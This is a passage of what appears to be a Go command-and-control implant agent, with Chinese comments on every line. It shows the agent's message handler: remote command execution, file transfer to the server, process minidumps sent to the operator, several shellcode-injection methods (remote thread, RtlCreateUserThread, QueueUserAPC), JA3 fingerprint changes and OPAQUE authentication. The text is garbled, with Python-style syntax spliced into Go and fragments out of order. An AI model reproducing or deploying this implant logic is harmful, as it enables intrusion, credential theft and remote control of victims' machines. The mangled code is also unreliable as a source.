        # 如果成功写入文件，将成功信息存储到命令对象的标准输出字段
        c.Stdout = fmt.Sprintf("Successfully uploaded file to %s on agent %s", p.FileLocation, a.ID.String())

# 如果代理不是下载文件，而是上传文件到服务器
if !p.IsDownload:
    # 如果代理设置了详细输出，打印文件传输类型信息
    if a.Verbose:
        message("note", "FileTransfer type: Upload")

    # 读取文件内容
    fileData, fileDataErr := ioutil.ReadFile(p.FileLocation)
    # 如果读取文件内容出现错误
    if fileDataErr != nil:
# 如果设置了详细输出标志，则打印警告消息，指出读取文件时发生错误
if a.Verbose {
    message("warn", fmt.Sprintf("There was an error reading %s", p.FileLocation))
    message("warn", fileDataErr.Error())
}
# 将错误信息存储到标准错误输出
c.Stderr = fmt.Sprintf("there was an error reading %s:\r\n%s", p.FileLocation, fileDataErr.Error())
} else {
# 创建一个 SHA1 哈希对象，用于计算文件的哈希值
fileHash := sha1.New() // #nosec G401 // Use SHA1 because it is what many Blue Team tools use
# 将文件数据写入哈希对象
_, errW := io.WriteString(fileHash, string(fileData))
# 如果写入过程中发生错误，则打印警告消息
if errW != nil {
    if a.Verbose {
        message("warn", fmt.Sprintf("There was an error generating the SHA1 file hash e:\r\n%s", errW.Error()))
    }
}

# 如果设置了详细输出标志，则打印上传文件的信息，包括文件名、大小和哈希值
if a.Verbose {
    message("note", fmt.Sprintf("Uploading file %s of size %d bytes and a SHA1 hash of %x to the server",
        p.FileLocation,
        len(fileData),
        fileHash.Sum(nil)))
}
# 创建一个文件传输对象，包括文件位置、文件数据的 base64 编码、是否下载、作业信息
ft := messages.FileTransfer{
    FileLocation: p.FileLocation,
    FileBlob:     base64.StdEncoding.EncodeToString([]byte(fileData)),
    IsDownload:   true,
    Job:          p.Job,
}

# 设置返回消息的类型为文件传输
returnMessage.Type = "FileTransfer"
# 设置返回消息的载荷为文件传输对象
returnMessage.Payload = ft
# 返回包含文件传输消息的返回消息和空错误
return returnMessage, nil
```

```
# 根据消息类型进行不同的处理
switch m.Type {
case "CmdPayload":
    # 将消息的载荷转换为命令载荷对象
    p := m.Payload.(messages.CmdPayload)
    # 设置命令对象的作业信息
    c.Job = p.Job
    # 执行命令载荷中的命令，并将标准输出和标准错误输出保存到命令对象中
    c.Stdout, c.Stderr = a.executeCommand(p, ExecuteCommand)
case "CmdPayloadScriptFromPath":
    # 将消息的载荷转换为命令载荷对象
    p := m.Payload.(messages.CmdPayload)
    # 设置命令对象的作业信息
    c.Job = p.Job
    # 执行命令载荷中的命令，并将标准输出和标准错误输出保存到命令对象中
    c.Stdout, c.Stderr = a.executeCommand(p, ExecuteCommandScriptInCommands)
# 根据消息类型进行不同的处理
case "CmdGoPayload":
    # 从消息中获取命令载荷
    p := m.Payload.(messages.CmdPayload)
    # 将作业设置为命令载荷中的作业
    c.Job = p.Job
    # 执行Go解释器命令，并将标准输出和标准错误输出保存到c.Stdout和c.Stderr中
    c.Stdout, c.Stderr = a.executeGoInterpreterCommand(p)
case "CmdGoProgressPayload":
    # 从消息中获取命令载荷
    p := m.Payload.(messages.CmdPayload)
    # 将作业设置为命令载荷中的作业
    c.Job = p.Job
    # 执行带有进度的Go解释器命令，并将标准输出和标准错误输出保存到c.Stdout和c.Stderr中
    c.Stdout, c.Stderr = a.executeGoInterpreterCommandProgress(p, c, returnMessage, a)
case "ServerOk":
    # 如果设置了详细输出模式，则打印接收到的服务器OK消息
    if a.Verbose:
        message("note", "Received Server OK, doing nothing")
    # 返回接收到的消息和空错误
    return returnMessage, nil
case "Module":
    # 如果设置了详细输出模式，则打印接收到的代理模块指令消息
    if a.Verbose:
        message("note", "Received Agent Module Directive")
    # 从消息中获取模块信息
    p := m.Payload.(messages.Module)
    # 将作业设置为模块信息中的作业
    c.Job = p.Job
    # 根据模块指令执行不同的操作
    switch p.Command:
		case "Minidump":
			// 如果设置了详细输出，打印接收到 Minidump 请求的消息
			if a.Verbose {
				message("note", "Received Minidump request")
			}

			// 确保提供的参数有效
			if len(p.Args) < 2 {
				// 参数不足
				c.Stderr = "not enough arguments provided to the Minidump module to dump a process"
				break
			}
			// 获取要转储的进程名称
			process := p.Args[0]
			// 将进程 ID 解析为整数
			pid, err := strconv.ParseInt(p.Args[1], 0, 32)
			if err != nil {
				// 如果无法将 PID 解析为整数，返回错误消息
				c.Stderr = fmt.Sprintf("minidump module could not parse PID as an integer:%s\r\n%s", p.Args[1], err.Error())
				break
			}

			// 临时路径初始化为空
			tempPath := ""
			// 如果提供了第三个参数
			if len(p.Args) == 3 {
			// 如果参数列表中有第三个参数，则将其赋值给tempPath变量
			tempPath = p.Args[2]
			}

			// 获取minidump
			// 调用miniDump函数，传入tempPath、process和pid参数，返回minidump数据和错误信息
			miniD, miniDumpErr := miniDump(tempPath, process, uint32(pid))

			// 从upload函数中复制并粘贴代码，并做适当修改
			// 如果miniDumpErr不为空，将错误信息赋值给c.Stderr
			if miniDumpErr != nil {
				c.Stderr = fmt.Sprintf("There was an error executing the miniDump module:\r\n%s",
					miniDumpErr.Error())
			} else {
				// 创建一个新的SHA256哈希对象
				fileHash := sha256.New()
				// 将minidump中的"FileContent"转换为[]byte类型，并计算其SHA256哈希值
				_, errW := io.WriteString(fileHash, string(miniD["FileContent"].([]byte)))
				// 如果计算哈希值时出现错误，根据Verbose标志输出警告信息
				if errW != nil {
					if a.Verbose {
						message("warn", fmt.Sprintf("There was an error generating the SHA256 file hash e:\r\n%s", errW.Error()))
					}
				}

				// 如果Verbose标志为true，输出详细信息
				if a.Verbose {
# 调用 message 函数，输出上传 minidump 文件大小和 SHA1 哈希值到服务器的消息
message("note", fmt.Sprintf("Uploading minidump file of size %d bytes and a SHA1 hash of %x to the server",
    len(miniD["FileContent"].([]byte)),
    fileHash.Sum(nil)))
# 创建文件传输消息对象
fileTransferMessage := messages.FileTransfer{
    FileLocation: fmt.Sprintf("%s.%d.dmp", miniD["ProcName"], miniD["ProcID"]),
    FileBlob:     base64.StdEncoding.EncodeToString(miniD["FileContent"].([]byte)),
    IsDownload:   true,
    Job:          p.Job,
}
# 设置返回消息类型为文件传输
returnMessage.Type = "FileTransfer"
# 设置返回消息的载荷为文件传输消息对象
returnMessage.Payload = fileTransferMessage
# 返回消息和空错误
return returnMessage, nil
# 处理默认情况
default:
    # 设置错误输出为不是有效的模块类型
    c.Stderr = fmt.Sprintf("%s is not a valid module type", p.Command)
# 处理代理控制情况
case "AgentControl":
    # 如果是详细模式
    if a.Verbose {
		// 打印日志，表示接收到代理控制消息
		message("note", "Received Agent Control Message")
	}
	// 将消息的载荷转换为代理控制消息结构
	p := m.Payload.(messages.AgentControl)
	// 将作业设置为消息中的作业
	c.Job = p.Job
	// 根据消息中的命令进行不同的操作
	switch p.Command {
	case "kill":
		// 如果设置了详细模式，打印日志表示接收到代理终止消息
		if a.Verbose {
			message("note", "Received Agent Kill Message")
		}
		// 退出程序
		os.Exit(0)
	case "sleep":
		// 如果设置了详细模式，打印日志表示设置代理的休眠时间
		if a.Verbose {
			message("note", fmt.Sprintf("Setting agent sleep time to %s", p.Args))
		}
		// 将消息中的参数解析为时间间隔
		t, err := time.ParseDuration(p.Args)
		// 如果解析出错，将错误信息保存到标准错误输出
		if err != nil {
			c.Stderr = fmt.Sprintf("there was an error changing the agent waitTime:\r\n%s", err.Error())
			break
		}
		// 如果时间间隔大于0
		if t > 0 {
// 如果命令是 "wait"，则将参数转换为时间并赋值给等待时间
if p.Cmd == "wait" {
    a.WaitTime = t
} else {
    // 如果提供的时间不大于零，则将错误信息赋值给标准错误输出，并跳出循环
    c.Stderr = fmt.Sprintf("the agent was provided with a time that was not greater than zero:\r\n%s", t.String())
    break
}

// 如果命令是 "skew"，则将参数转换为整型并赋值给偏移时间
case "skew":
    t, err := strconv.ParseInt(p.Args, 10, 64)
    if err != nil {
        // 如果转换出错，则将错误信息赋值给标准错误输出，并跳出循环
        c.Stderr = fmt.Sprintf("there was an error changing the agent skew interval:\r\n%s", err.Error())
        break
    }
    if a.Verbose {
        // 如果设置了详细输出，打印消息并设置偏移时间
        message("note", fmt.Sprintf("Setting agent skew interval to %d", t))
    }
    a.Skew = t

// 如果命令是 "padding"，则将参数转换为整型并赋值给消息填充大小
case "padding":
    t, err := strconv.Atoi(p.Args)
    if err != nil {
        // 如果转换出错，则将错误信息赋值给标准错误输出，并跳出循环
        c.Stderr = fmt.Sprintf("there was an error changing the agent message padding size:\r\n%s", err.Error())
        break
			}
			// 如果设置了详细输出，打印设置代理消息最大填充大小的消息
			if a.Verbose {
				message("note", fmt.Sprintf("Setting agent message maximum padding size to %d", t))
			}
			// 设置代理消息最大填充大小
			a.PaddingMax = t
		case "initialize":
			// 如果设置了详细输出，打印接收到代理重新初始化消息的消息
			if a.Verbose {
				message("note", "Received agent re-initialize message")
			}
			// 将代理的初始化标志设置为false
			a.initial = false
		case "maxretry":
			// 将参数转换为整数
			t, err := strconv.Atoi(p.Args)
			// 如果转换出错，打印错误消息并跳出
			if err != nil {
				c.Stderr = fmt.Sprintf("There was an error changing the agent max retries:\r\n%s", err.Error())
				break
			}
			// 如果设置了详细输出，打印设置代理最大重试次数的消息
			if a.Verbose {
				message("note", fmt.Sprintf("Setting agent max retries to %d", t))
			}
			// 设置代理的最大重试次数
			a.MaxRetry = t
# 根据命令类型进行不同的操作
case "killdate":
    # 将参数转换为整数
    d, err := strconv.Atoi(p.Args)
    # 如果转换出错，将错误信息存储到标准错误输出
    if err != nil:
        c.Stderr = fmt.Sprintf("there was an error converting the kill date to an integer:\r\n%s", err.Error())
        break
    # 将转换后的整数赋值给 KillDate
    a.KillDate = int64(d)
    # 如果设置了详细输出，打印设置的 Kill Date
    if a.Verbose:
        message("info", fmt.Sprintf("Set Kill Date to: %s", time.Unix(a.KillDate, 0).UTC().Format(time.RFC3339)))
case "ja3":
    # 去除参数中的引号，赋值给 JA3
    a.JA3 = strings.Trim(p.Args, "\"'")

    # 更新客户端
    var err error
    # 根据协议和 JA3 获取客户端
    a.Client, err = getClient(a.Proto, "", a.JA3)
    # 如果出现错误
    if err != nil:
# 设置标准错误输出，如果设置代理客户端时出现错误
c.Stderr = fmt.Sprintf("there was an error setting the agent client:\r\n%s", err.Error())
break

# 如果设置了详细输出并且设置了JA3签名，则打印消息
message("note", fmt.Sprintf("Set agent JA3 signature to:%s", a.JA3))
# 如果设置了详细输出并且未设置JA3签名，则打印消息
message("note", fmt.Sprintf("Setting agent client back to default using %s protocol", a.Proto))

# 如果命令类型不是AgentControl，则设置标准错误输出
c.Stderr = fmt.Sprintf("%s is not a valid AgentControl message type.", p.Command)
# 返回代理信息消息
return a.getAgentInfoMessage(), nil

# 如果命令类型是Shellcode，并且设置了详细输出，则打印消息
if a.Verbose:
    message("note", "Received Execute shellcode command")

# 将消息的载荷转换为Shellcode类型
s := m.Payload.(messages.Shellcode)
# 初始化错误变量
var e error
		// 将 s.Job 赋值给 c.Job
		c.Job = s.Job
		// 调用 executeShellcode 函数执行 shellcode，结果存储在 e 中
		e = a.executeShellcode(s) // Execution method determined in function

		// 如果 e 不为空，将错误信息存储在 c.Stderr 中
		if e != nil {
			c.Stderr = fmt.Sprintf("there was an error with the shellcode module:\r\n%s", e.Error())
		} else {
			// 否则将执行成功信息存储在 c.Stdout 中
			c.Stdout = "Shellcode module executed without errors"
		}
	case "NativeCmd":
		// 将 m.Payload 转换为 messages.NativeCmd 类型，并赋值给 p
		p := m.Payload.(messages.NativeCmd)
		// 将 p.Job 赋值给 c.Job
		c.Job = p.Job
		// 根据 p.Command 的值进行不同的操作
		switch p.Command {
		case "ls":
			// 调用 list 函数执行 ls 命令，结果存储在 listing 中
			listing, err := a.list(p.Args)
			// 如果有错误，将错误信息存储在 c.Stderr 中
			if err != nil {
				c.Stderr = fmt.Sprintf("there was an error executing the 'ls' command:\r\n%s", err.Error())
				break
			}
			// 否则将执行结果存储在 c.Stdout 中
			c.Stdout = listing
		case "cd":
// 尝试改变当前工作目录为参数指定的目录
err := os.Chdir(p.Args)
if err != nil {
    // 如果出错，将错误信息存入标准错误输出
    c.Stderr = fmt.Sprintf("there was an error changing directories when executing the 'cd' command:\r\n%s", err.Error())
} else {
    // 如果成功，获取当前工作目录
    path, pathErr := os.Getwd()
    if pathErr != nil {
        // 如果获取当前工作目录出错，将错误信息存入标准错误输出
        c.Stderr = fmt.Sprintf("there was an error getting the working directory when executing the 'cd' command:\r\n%s", pathErr.Error())
    } else {
        // 如果成功获取当前工作目录，将信息存入标准输出
        c.Stdout = fmt.Sprintf("Changed working directory to %s", path)
    }
}
// 如果命令是"pwd"
case "pwd":
    // 获取当前工作目录
    dir, err := os.Getwd()
    if err != nil {
        // 如果出错，将错误信息存入标准错误输出
        c.Stderr = fmt.Sprintf("there was an error getting the working directory when executing the 'pwd' command:\r\n%s", err.Error())
    } else {
        // 如果成功，将当前工作目录信息存入标准输出
        c.Stdout = fmt.Sprintf("Current working directory: %s", dir)
    }
// 如果命令不是"cd"或"pwd"
default:
    // 将错误信息存入标准错误输出
    c.Stderr = fmt.Sprintf("%s is not a valid NativeCMD type", p.Command)
		}
	case "KeyExchange":
		// 如果消息类型是 "KeyExchange"，则将消息的载荷转换为 KeyExchange 结构体，并将其中的公钥赋值给变量 a.PublicKey
		p := m.Payload.(messages.KeyExchange)
		a.PublicKey = p.PublicKey
		// 返回消息和空错误
		return returnMessage, nil
	case "ReAuthenticate":
		// 如果变量 a.Verbose 为真，则打印重新认证的提示信息
		if a.Verbose {
			message("note", "Re-authenticating with OPAQUE protocol")
		}
		// 使用 OPAQUE 协议进行重新认证
		errAuth := a.opaqueAuthenticate()
		// 如果重新认证过程中出现错误，则返回消息和格式化后的错误信息
		if errAuth != nil {
			return returnMessage, fmt.Errorf("there was an error during OPAQUE Re-Authentication:\r\n%s", errAuth)
		}
		// 将消息类型置空，返回消息和空错误
		m.Type = ""
		return returnMessage, nil
	default:
		// 如果消息类型不是以上任何一种，则返回消息和格式化后的错误信息
		return returnMessage, fmt.Errorf("%s is not a valid message type", m.Type)
	}
# 如果设置了Verbose并且标准输出不为空，则打印成功消息
if a.Verbose && c.Stdout != "":
    message("success", c.Stdout)

# 如果设置了Verbose并且标准错误不为空，则打印警告消息
if a.Verbose && c.Stderr != "":
    message("warn", c.Stderr)

# 设置返回消息的类型为"CmdResults"，并将执行命令的结果赋给Payload
returnMessage.Type = "CmdResults"
returnMessage.Payload = c

# 如果设置了Debug，则打印调试信息
if a.Debug:
    message("debug", "Leaving agent.messageHandler function without error")

# 返回消息和空的错误
return returnMessage, nil
}

# 执行命令的函数，接收命令载荷和执行命令的函数作为参数，返回标准输出和标准错误
func (a *Agent) executeCommand(j messages.CmdPayload, executeFunction executeCommandFunction) (stdout string, stderr string) {
    # 如果设置了Debug，则打印接收到的执行命令函数的输入参数
    if a.Debug:
        message("debug", fmt.Sprintf("Received input parameter for executeCommand function: %s", j))

    # 如果设置了Verbose
    else if a.Verbose:
	// 输出执行命令的消息
	message("success", fmt.Sprintf("Executing command %s %s", j.Command, j.Args))
	}

	// 执行命令，并获取标准输出和标准错误
	stdout, stderr = executeFunction(j.Command, j.Args)

	// 如果设置了详细模式
	if a.Verbose {
		// 如果标准错误不为空，输出警告消息和标准输出、标准错误
		if stderr != "" {
			message("warn", fmt.Sprintf("There was an error executing the command: %s", j.Command))
			message("success", stdout)
			message("warn", fmt.Sprintf("Error: %s", stderr))

		// 如果标准错误为空，输出成功消息和标准输出
		} else {
			message("success", fmt.Sprintf("Command output:\r\n\r\n%s", stdout))
		}
	}

	// 返回标准输出和标准错误
	return stdout, stderr
}

// 执行 Go 解释器命令
func (a *Agent) executeGoInterpreterCommand(j messages.CmdPayload) (stdout string, stderr string) {
# 如果调试模式开启，则打印接收到的执行命令函数的输入参数
if a.Debug:
    message("debug", fmt.Sprintf("Received input parameter for executeCommand function: %s", j))

# 如果详细模式开启，则打印执行命令和参数
elif a.Verbose:
    message("success", fmt.Sprintf("Executing command %s %s", j.Command, j.Args))

# 记录执行的命令和参数
a.record.recordCommand(j.Command, j.ArgsArray)

# 使用Go解释器执行命令，并记录标准输出和标准错误
stdout, stderr = ExecuteCommandGoInterpreter(j.Command, j.ArgsArray)
a.record.recordOutput(stdout)

# 如果详细模式开启，则根据标准错误输出打印相应信息
if a.Verbose:
    if stderr != "":
        message("warn", fmt.Sprintf("There was an error executing the command: %s", j.Command))
        message("success", stdout)
        message("warn", fmt.Sprintf("Error: %s", stderr))
    else:
        message("success", fmt.Sprintf("Command output:\r\n\r\n%s", stdout))
// executeGoInterpreterCommandProgress 是 Agent 结构体的一个方法，用于执行 Go 解释器命令并返回标准输出和标准错误
func (a *Agent) executeGoInterpreterCommandProgress(j messages.CmdPayload, result messages.CmdResults, returnMessage messages.Base, agent *Agent) (stdout string, stderr string) {
    // 如果调试模式开启，打印接收到的执行命令的输入参数
    if a.Debug {
        message("debug", fmt.Sprintf("Received input parameter for executeCommand function: %s", j))
    // 如果详细模式开启，打印执行命令和参数
    } else if a.Verbose {
        message("success", fmt.Sprintf("Executing command %s %s", j.Command, j.Args))
    }
    // 执行 Go 解释器命令，并获取标准输出和标准错误
    stdout, stderr = ExecuteCommandGoInterpreterProgress(j.Command, j.ArgsArray, result, returnMessage, agent)

    /*
        for {
            returnMessage.Type = "CmdResults"
    */
}
			// 设置标准输出为 "ma kore ?"
			c.Stdout = "ma kore ?"
			// 将返回消息的载荷设置为 c
			returnMessage.Payload = c
			// 发送 post 消息
			a.sendMessage("post", returnMessage)
		}*/

	// 如果设置了详细输出
	if a.Verbose {
		// 如果标准错误不为空，输出警告消息和标准输出
		if stderr != "" {
			message("warn", fmt.Sprintf("There was an error executing the command: %s", j.Command))
			message("success", stdout)
			message("warn", fmt.Sprintf("Error: %s", stderr))

		} else {
			// 输出成功消息和标准输出
			message("success", fmt.Sprintf("Command output:\r\n\r\n%s", stdout))
		}
	}

	// 返回标准输出和标准错误
	return stdout, stderr
}

// 记录命令2
func recordCommand2(command string, args []string){
# 创建一个字符串构建器，用于构建输出的字符串
var sb strings.Builder
# 将当前时间格式化为 RFC3339 格式，并添加到字符串构建器中
sb.WriteString(fmt.Sprintf("%s [*] Payload:\n", time.Now().UTC().Format(time.RFC3339)))
# 将命令添加到字符串构建器中
sb.WriteString(command + "\n")
# 遍历参数列表，将每个参数添加到字符串构建器中
for _, arg := range(args) {
    sb.WriteString(arg + "\n")
}
# 添加一个换行符到字符串构建器中
sb.WriteString("\n")
# 将构建好的字符串记录到文件中
recordToFile(sb.String())

# 记录输出到文件中
func recordOutput2(output string){
    # 创建一个字符串构建器，用于构建输出的字符串
    var sb strings.Builder
    # 将当前时间格式化为 RFC3339 格式，并添加到字符串构建器中
    sb.WriteString(fmt.Sprintf("%s [*] Output:\n", time.Now().UTC().Format(time.RFC3339)))
    # 将输出内容添加到字符串构建器中
    sb.WriteString(output + "\n")
    # 将构建好的字符串记录到文件中
    recordToFile(sb.String())
}

# 将输出内容记录到文件中
func recordToFile2(output string){
    # 定义文件名
    filename := "/tmp/dat1"
    // 打开文件，如果文件不存在则创建，以追加模式写入，权限为0644
	f, err := os.OpenFile(filename, os.O_APPEND|os.O_WRONLY|os.O_CREATE, 0644)
	// 如果打开文件出错，则抛出异常
	if err != nil {
		panic(err)
	}

	// 延迟关闭文件
	defer f.Close()
	// 向文件写入字符串，如果出错则记录警告信息
	if _, err = f.WriteString(output); err != nil {
		message("warn", fmt.Sprintf("Failed to write to file: %s, error: %s", filename, output))
	}
}

// 执行 shellcode 的函数
func (a *Agent) executeShellcode(shellcode messages.Shellcode) error {
	// 如果处于调试模式，则记录接收到的 shellcode 参数信息
	if a.Debug {
		message("debug", fmt.Sprintf("Received input parameter for executeShellcode function: %v", shellcode))
	}

	// 解码 shellcode 字符串为字节数组
	shellcodeBytes, errDecode := base64.StdEncoding.DecodeString(shellcode.Bytes)
# 如果解码出现错误
if errDecode != nil:
    # 如果设置了详细输出，打印警告信息
    if a.Verbose:
        message("warn", fmt.Sprintf("There was an error decoding the Base64 string: %s", shellcode.Bytes))
        message("warn", errDecode.Error())
    # 返回解码错误
    return errDecode

# 如果设置了详细输出，打印执行方法信息
if a.Verbose:
    message("info", fmt.Sprintf("Shelcode execution method: %s", shellcode.Method))

# 如果设置了调试模式，打印执行 shellcode 信息
if a.Debug:
    message("info", fmt.Sprintf("Executing shellcode %s", shellcodeBytes))

# 如果 shellcode 的执行方法是 "self"
if shellcode.Method == "self":
    # 执行 shellcode，并捕获可能的错误
    err := ExecuteShellcodeSelf(shellcodeBytes)
    # 如果执行出错
    if err != nil:
        # 如果设置了详细输出，打印警告信息
        if a.Verbose:
            message("warn", fmt.Sprintf("There was an error executing the shellcode: \r\n%s", shellcodeBytes))
# 如果 shellcode 的执行方式是本地的
if shellcode.Method == "local":
    # 执行本地 shellcode
    err := ExecuteShellcodeLocal(shellcodeBytes, shellcode.PID)
    # 如果执行出错
    if err != nil:
        # 如果设置了详细输出，打印错误信息
        if a.Verbose:
            message("warn", fmt.Sprintf("There was an error executing the shellcode: \r\n%s", shellcodeBytes))
            message("warn", fmt.Sprintf("Error: %s", err.Error()))
    # 如果执行成功
    else:
        # 如果设置了详细输出，打印成功信息
        if a.Verbose:
            message("success", "Shellcode was successfully executed")
    # 返回错误信息
    return err
# 如果 shellcode 的执行方式是远程的
else if shellcode.Method == "remote":
    # 执行远程 shellcode
    err := ExecuteShellcodeRemote(shellcodeBytes, shellcode.PID)
    # 如果执行出错
    if err != nil:
        # 如果设置了详细输出，打印错误信息
        if a.Verbose:
            message("warn", fmt.Sprintf("There was an error executing the shellcode: \r\n%s", shellcodeBytes))
            message("warn", fmt.Sprintf("Error: %s", err.Error()))
    # 如果执行成功
    else:
        # 如果设置了详细输出，打印成功信息
        if a.Verbose:
            message("success", "Shellcode was successfully executed")
		# 如果存在错误，直接返回错误
		return err
	# 如果 shellcode 的执行方法是 "rtlcreateuserthread"
	} else if shellcode.Method == "rtlcreateuserthread" {
		# 执行 "rtlcreateuserthread" 方法的 shellcode
		err := ExecuteShellcodeRtlCreateUserThread(shellcodeBytes, shellcode.PID)
		# 如果执行出错
		if err != nil {
			# 如果设置了详细输出，打印警告信息和错误信息
			if a.Verbose {
				message("warn", fmt.Sprintf("There was an error executing the shellcode: \r\n%s", shellcodeBytes))
				message("warn", fmt.Sprintf("Error: %s", err.Error()))
			}
		# 如果执行成功
		} else {
			# 如果设置了详细输出，打印成功信息
			if a.Verbose {
				message("success", "Shellcode was successfully executed")
			}
		}
		# 返回可能存在的错误
		return err
	# 如果 shellcode 的执行方法是 "userapc"
	} else if shellcode.Method == "userapc" {
		# 执行 "userapc" 方法的 shellcode
		err := ExecuteShellcodeQueueUserAPC(shellcodeBytes, shellcode.PID)
		# 如果执行出错
		if err != nil {
			# 如果设置了详细输出，打印警告信息和错误信息
			if a.Verbose {
				message("warn", fmt.Sprintf("There was an error executing the shellcode: \r\n%s", shellcodeBytes))
				message("warn", fmt.Sprintf("Error: %s", err.Error()))
			}
		}
	} else {
		// 如果执行失败，打印警告信息
		if a.Verbose {
			message("warn", fmt.Sprintf("Invalid shellcode execution method: %s", shellcode.Method))
		}
		// 返回错误信息
		return fmt.Errorf("invalid shellcode execution method %s", shellcode.Method)
	}
}

// 定义一个名为list的方法，用于列出指定路径下的内容
func (a *Agent) list(path string) (string, error) {
	// 如果处于调试模式，打印接收到的参数信息
	if a.Debug {
		message("debug", fmt.Sprintf("Received input parameter for list command function: %s", path))
	} else if a.Verbose {
		// 如果处于详细模式，打印接收到的参数信息
	// 调用 message 函数，输出成功信息，格式化输出目录内容的信息
	// 这里需要 message 函数的定义和作用来完整解释
	message("success", fmt.Sprintf("listing directory contents for: %s", path))
	}

	// 将相对路径解析为绝对路径
	// 如果解析失败，返回错误
	aPath, errPath := filepath.Abs(path)
	if errPath != nil {
		return "", errPath
	}
	// 读取目录下的文件信息
	files, err := ioutil.ReadDir(aPath)

	// 如果读取失败，返回错误
	if err != nil {
		return "", err
	}

	// 格式化输出目录的详细信息
	details := fmt.Sprintf("Directory listing for: %s\r\n\r\n", aPath)

	// 遍历目录下的文件
	for _, f := range files {
		// 获取文件权限信息
		perms := f.Mode().String()
		// 获取文件大小
		size := strconv.FormatInt(f.Size(), 10)
		// 获取文件修改时间
		modTime := f.ModTime().String()[0:19]
		// 获取文件的名称
		name := f.Name()
		// 将权限、修改时间、大小和名称拼接成一个字符串，添加到details中
		details = details + perms + "\t" + modTime + "\t" + size + "\t" + name + "\n"
	}
	// 返回文件详情和空错误
	return details, nil
}

// opaqueRegister 用于执行 OPAQUE 密码认证密钥交换（PAKE）协议的注册
func (a *Agent) opaqueRegister() error {

	// 如果设置了详细模式，打印提示信息
	if a.Verbose {
		message("note", "Starting OPAQUE Registration")
	}

	// 构建 OPAQUE 用户注册初始化
	userReg := gopaque.NewUserRegister(gopaque.CryptoDefault, a.ID.Bytes(), nil)
	userRegInit := userReg.Init(a.pwdU)

	// 如果设置了调试模式，打印用户ID和Alpha值
	if a.Debug {
		message("debug", fmt.Sprintf("OPAQUE UserID: %x", userRegInit.UserID))
		message("debug", fmt.Sprintf("OPAQUE Alpha: %v", userRegInit.Alpha))
```

	// 打印调试信息，格式化输出 OPAQUE PwdU 的十六进制值
	message("debug", fmt.Sprintf("OPAQUE PwdU: %x", a.pwdU))
}

// 将 userRegInit 转换为字节流
userRegInitBytes, errUserRegInitBytes := userRegInit.ToBytes()
if errUserRegInitBytes != nil {
	// 如果转换出错，返回错误信息
	return fmt.Errorf("there was an error marshalling the OPAQUE user registration initialization message to bytes:\r\n%s", errUserRegInitBytes.Error())
}

// 要发送到服务器的消息
regInitBase := messages.Base{
	Version: 1.0,
	ID:      a.ID,
	Type:    "RegInit",
	Payload: userRegInitBytes,
	Padding: core.RandStringBytesMaskImprSrc(a.PaddingMax),
}

// 从 PSK 设置 JWT 和 JWE 加密密钥的密钥
k := sha256.Sum256([]byte(a.psk))
a.secret = k[:]
// 使用预身份验证预共享密钥创建 JWT；在身份验证后由服务器更新
agentJWT, errJWT := a.getJWT()
if errJWT != nil {
    return fmt.Errorf("在 OPAQUE 注册期间获取初始 JWT 时出错：\r\n%s", errJWT)
}
a.JWT = agentJWT

// 发送代理 OPAQUE 用户注册初始化消息
regInitResp, errRegInitResp := a.sendMessage("POST", regInitBase)

if errRegInitResp != nil {
    return fmt.Errorf("发送代理 OPAQUE 用户注册初始化消息时出错：\r\n%s", errRegInitResp.Error())
}

// 检查响应消息类型是否为 "RegInit"
if regInitResp.Type != "RegInit" {
    return fmt.Errorf("在 OPAQUE 用户注册初始化响应中，无效的消息类型 %s", regInitResp.Type)
}

// 声明服务器注册初始化变量
var serverRegInit gopaque.ServerRegisterInit
	// 从字节流中解析出服务器注册初始化消息
	errServerRegInit := serverRegInit.FromBytes(gopaque.CryptoDefault, regInitResp.Payload.([]byte))
	// 如果解析出错，返回错误信息
	if errServerRegInit != nil {
		return fmt.Errorf("there was an error unmarshalling the OPAQUE server register initialization message from bytes:\r\n%s", errServerRegInit.Error())
	}

	// 如果设置了详细输出，打印接收到的服务器注册初始化消息
	if a.Verbose {
		message("note", "Received OPAQUE server registration initialization message")
	}

	// 如果设置了调试模式，打印服务器注册初始化消息的一些字段
	if a.Debug {
		message("debug", fmt.Sprintf("OPAQUE Beta: %v", serverRegInit.Beta))
		message("debug", fmt.Sprintf("OPAQUE V: %v", serverRegInit.V))
		message("debug", fmt.Sprintf("OPAQUE PubS: %s", serverRegInit.ServerPublicKey))
	}

	// TODO: 扩展 gopaque 以运行 RwdU 通过 n 次 PBKDF2 迭代

	// 完成用户注册
	userRegComplete := userReg.Complete(&serverRegInit)

	// 将用户注册完成消息转换为字节流
	userRegCompleteBytes, errUserRegCompleteBytes := userRegComplete.ToBytes()
	// 如果转换出错，处理错误信息
	if errUserRegCompleteBytes != nil {
		// 返回一个格式化的错误信息，指示将 OPAQUE 用户注册完成消息编组为字节时出现错误
		return fmt.Errorf("there was an error marshalling the OPAQUE user registration complete message to bytes:\r\n%s", errUserRegCompleteBytes.Error())
	}

	// 如果调试模式开启，打印 OPAQUE EnvU 和 PubU 的值
	if a.Debug {
		message("debug", fmt.Sprintf("OPAQUE EnvU: %x", userRegComplete.EnvU))
		message("debug", fmt.Sprintf("OPAQUE PubU: %v", userRegComplete.UserPublicKey))
	}

	// 创建要发送到服务器的消息
	regCompleteBase := messages.Base{
		Version: 1.0,
		ID:      a.ID,
		Type:    "RegComplete",
		Payload: userRegCompleteBytes,
		Padding: core.RandStringBytesMaskImprSrc(a.PaddingMax),
	}

	// 发送消息到服务器，并接收响应
	regCompleteResp, errRegCompleteResp := a.sendMessage("POST", regCompleteBase)

	// 如果发送消息时出现错误
	if errRegCompleteResp != nil {
// 返回一个格式化的错误信息，包含发送代理 OPAQUE 用户注册完成消息时出现的错误
return fmt.Errorf("there was an error sending the agent OPAQUE user registration complete message:\r\n%s", errRegCompleteResp.Error())
}

// 检查注册完成响应的类型是否为 "RegComplete"，如果不是则返回错误信息
if regCompleteResp.Type != "RegComplete" {
    return fmt.Errorf("invalid message type %s in resopnse to OPAQUE user registration complete", regCompleteResp.Type)
}

// 如果设置了详细输出标志，打印一条消息表示 OPAQUE 注册完成
if a.Verbose {
    message("note", "OPAQUE registration complete")
}

// 返回空错误，表示认证成功
return nil
}

// opaqueAuthenticate 用于使用 OPAQUE 密码认证密钥交换（PAKE）协议对代理进行认证
func (a *Agent) opaqueAuthenticate() error {

// 如果设置了详细输出标志，打印一条消息表示开始 OPAQUE 认证
if a.Verbose {
    message("note", "Starting OPAQUE Authentication")
}
// 1 - 使用默认加密算法创建一个带有嵌入式密钥交换的 NewUserAuth
userKex := gopaque.NewKeyExchangeSigma(gopaque.CryptoDefault)
